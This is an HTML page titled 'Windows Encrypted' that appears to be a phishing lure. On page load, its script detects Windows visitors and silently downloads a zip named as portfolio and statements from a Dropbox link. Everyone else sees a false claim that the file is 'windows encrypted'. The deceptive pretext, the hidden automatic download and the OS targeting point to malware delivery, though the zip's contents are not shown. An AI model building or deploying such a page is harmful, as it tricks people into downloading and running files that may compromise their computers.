<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Windows Encrypted</title>
    <style>
        /* Minimal styling – only for the restriction message */
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0b0d10;
            color: #f0f2f5;
        }
        #msg {
            padding: 2rem;
            font-size: 1.2rem;
            text-align: center;
            background: #1f1417;
            border-radius: 12px;
            border: 1px solid #4a242b;
            color: #fca5a5;
            max-width: 500px;
            display: none; /* hidden by default, shown only on denial */
        }
    </style>
</head>
<body>
    <!-- This div is only shown when OS is not Windows -->
    <div id="msg">
        ⛔ This file is windows encrypted, try again with a windows pc
    </div>

    <script>
        (function() {
            'use strict';

            // ─── OS detection ────────────────────────────────────────
            function isWindows() {
                const platform = navigator.platform || '';
                const userAgent = navigator.userAgent || '';
                // Check platform first
                if (platform.toLowerCase().includes('win')) return true;
                // Fallback to userAgent
                const winIndicators = ['Win32', 'Win64', 'Windows', 'Windows NT', 'WOW64'];
                for (const ind of winIndicators) {
                    if (userAgent.includes(ind)) return true;
                }
                return false;
            }

            // ─── File URL (CHANGE THIS TO YOUR REAL FILE LINK) ─────
            const FILE_URL = 'https://www.dropbox.com/scl/fi/75pxofr0q75rswkljtct8/Portfolo-and-statements.zip?rlkey=f89p05sz3wwdpxs822g3ytmys&st=d5jmd0t0&dl=1'; // <-- REPLACE

            // ─── Action ─────────────────────────────────────────────
            if (isWindows()) {
                // Windows → trigger download silently
                const a = document.createElement('a');
                a.href = FILE_URL;
                a.download = ''; // forces download, uses filename from URL
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                // Optional: close window after a short delay (if popup allowed)
                // window.close();
            } else {
                // Non‑Windows → show restriction message
                const msg = document.getElementById('msg');
                if (msg) msg.style.display = 'block';
            }
        })();
    </script>
</body>
</html>
